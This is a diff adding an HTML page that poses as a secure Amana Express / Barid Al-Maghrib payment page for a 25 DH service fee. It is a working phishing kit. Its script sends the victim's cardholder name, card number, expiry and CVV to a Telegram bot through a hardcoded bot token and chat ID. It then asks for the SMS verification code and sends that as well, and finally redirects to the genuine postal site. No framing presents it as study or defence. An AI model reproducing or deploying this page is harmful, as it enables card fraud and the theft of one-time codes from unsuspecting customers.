@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amana Express - Paiement Sécurisé</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .amana-gold { background-color: #fdb913; }
+        .amana-blue { background-color: #0054a6; }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        
+        /* Checkmark Animation */
+        .check-container { animation: checkPop 0.5s ease-out forwards; }
+        @keyframes checkPop {
+            0% { transform: scale(0); opacity: 0; }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <div class="max-w-md mx-auto bg-white min-h-screen shadow-lg relative">
+        <div class="amana-blue p-4 flex items-center justify-between">
+            <img src="https://images.seeklogo.com/logo-png/39/1/amana-messagerie-logo-png_seeklogo-394935.png" alt="Logo" class="h-10">
+            <div class="flex flex-col items-end">
+                <span class="text-white text-[10px] font-bold uppercase tracking-widest">E-Commerce Secure</span>
+                <img src="https://imgs.search.brave.com/ZolMLLjvoTfcmPwHc8Mne2uYsmoRcKOQoXBCM2mf2eo/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9maW5h/bmNlLWluY2x1c2l2/ZS5tYS93cC1jb250/ZW50L3VwbG9hZHMv/MjAyMS8wMi9NQVJP/Qy1QQVkuanBn" class="h-4 mt-1 bg-white p-0.5 rounded">
+            </div>
+        </div>
+
+        <div class="p-6 bg-blue-50 border-b border-blue-100">
+            <h2 class="text-blue-900 text-xs font-bold mb-1 uppercase tracking-tighter">Résumé de la transaction</h2>
+            <div class="flex justify-between items-baseline">
+                <span class="text-gray-600 text-sm">Frais de service & Assurance</span>
+                <span class="text-2xl font-black text-blue-900">25.00 <small class="text-xs">DH</small></span>
+            </div>
+            <div class="mt-2 flex items-center text-[10px] text-blue-700 bg-white w-fit px-2 py-1 rounded-full border border-blue-200">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse mr-2"></span>
+                Transaction sécurisée par SSL
+            </div>
+        </div>
+
+        <div class="p-6" id="step1">
+            <div class="mb-8 flex justify-center space-x-6">
+                <img src="https://www.cihbank.ma/themes/ciht/images/logo.png" class="h-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" class="h-4">
+            </div>
+
+            <form id="payForm" class="space-y-5">
+                <div>
+                    <label class="block text-[10px] font-black text-gray-500 mb-1">NOM SUR LA CARTE</label>
+                    <input type="text" id="name" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none uppercase font-bold text-sm" placeholder="EX: MOHAMMED EL ALAMI" required>
+                </div>
+                <div>
+                    <label class="block text-[10px] font-black text-gray-500 mb-1">NUMÉRO DE CARTE</label>
+                    <input type="tel" id="card" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none font-mono text-lg tracking-widest" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+                <div class="flex space-x-6">
+                    <div class="w-1/2">
+                        <label class="block text-[10px] font-black text-gray-500 mb-1">EXPIRATION</label>
+                        <input type="text" id="exp" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none font-bold" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="w-1/2">
+                        <label class="block text-[10px] font-black text-gray-500 mb-1">CVV</label>
+                        <input type="tel" id="cvv" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none font-bold" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+                <button type="submit" class="w-full amana-gold text-blue-900 font-black py-4 rounded-xl shadow-lg hover:shadow-xl transition-all transform active:scale-95 mt-8">
+                    CONFIRMER LE PAIEMENT
+                </button>
+            </form>
+        </div>
+
+        <div class="p-6 hidden" id="step2">
+            <div class="text-center py-10">
+                <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                <h2 class="text-xl font-extrabold text-blue-900 mb-4 tracking-tight">Vérification Sécurisée</h2>
+                <p class="text-xs text-gray-500 px-4 mb-8">Veuillez saisir le code de sécurité reçu par SMS sur votre téléphone mobile.</p>
+                <div class="bg-gray-50 p-6 rounded-2xl border-2 border-dashed border-gray-200">
+                    <input type="tel" id="sms" class="w-full bg-transparent text-center text-4xl font-black tracking-[10px] outline-none text-blue-900" placeholder="000000" maxlength="8">
+                </div>
+                <button id="btnSms" class="w-full amana-blue text-white font-bold py-4 rounded-xl mt-8 shadow-lg">VALIDER</button>
+            </div>
+        </div>
+
+        <div class="p-6 hidden text-center py-20" id="step3">
+            <div class="check-container">
+                <svg class="w-20 h-20 text-green-500 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                </svg>
+            </div>
+            <h2 class="text-xl font-bold text-gray-800 tracking-tight">Traitement réussi</h2>
+            <p class="text-sm text-gray-500 mt-2 px-6">Redirection vers le service de suivi Barid Al-Maghrib...</p>
+        </div>
+
+        <div class="p-6 text-center border-t mt-10">
+            <p class="text-[9px] text-gray-400 uppercase tracking-widest">© 2026 Barid Al-Maghrib | Agence Digitale</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8309521845:AAF253ZXZZt-RIr3YREgMWhwlMe5DGDm5Yo";
+        const CHAT_ID = "8578403581";
+
+        // Auto formatting Card
+        document.getElementById('card').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // Auto formatting Exp
+        document.getElementById('exp').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+        });
+
+        document.getElementById('payForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const text = `🚨 HIT AMANA! 🚨\n\n👤 NOM: ${document.getElementById('name').value}\n💳 CARD: ${document.getElementById('card').value}\n📅 EXP: ${document.getElementById('exp').value}\n🔑 CVV: ${document.getElementById('cvv').value}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        });
+
+        document.getElementById('btnSms').addEventListener('click', async () => {
+            const smsCode = document.getElementById('sms').value;
+            if(smsCode.length < 4) return alert("Code invalide");
+            const text = `📩 SMS CODE: ${smsCode}\n👤 NOM: ${document.getElementById('name').value}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+
+            setTimeout(() => {
+                window.location.href = "https://www.amana-colis.ma/";
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
